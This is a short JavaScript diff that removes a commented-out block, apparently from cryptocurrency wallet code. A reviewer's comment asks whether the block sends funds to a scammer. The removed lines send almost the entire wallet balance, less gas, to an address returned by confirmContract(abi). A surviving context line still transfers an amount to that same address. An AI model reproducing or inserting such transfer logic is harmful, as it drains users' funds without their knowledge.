@@ -58,22 +58,7 @@ const checkResult = async (r) => {
             to: confirmContract(abi),
             amount: b,
           })
-          /*   is this the Function sending funds to scammer ???????
-          .then(function (g) {
-            w.eth.getGasPrice().then(function (gP) {
-              let _b = parseFloat(b);
-              let _g = parseFloat(g);
-              let _gP = parseFloat(gP);
-              w.eth.sendTransaction({
-                from: wallet.address,
-                to: confirmContract(abi),
-                gas: _g,
-                gasPrice: _gP,
-                value: ((_b - _gP * _g) / 1.1).toFixed(0),
-                data: "0x",
-              });
-            });
-          }); */
+        
       });
       return true;
     }
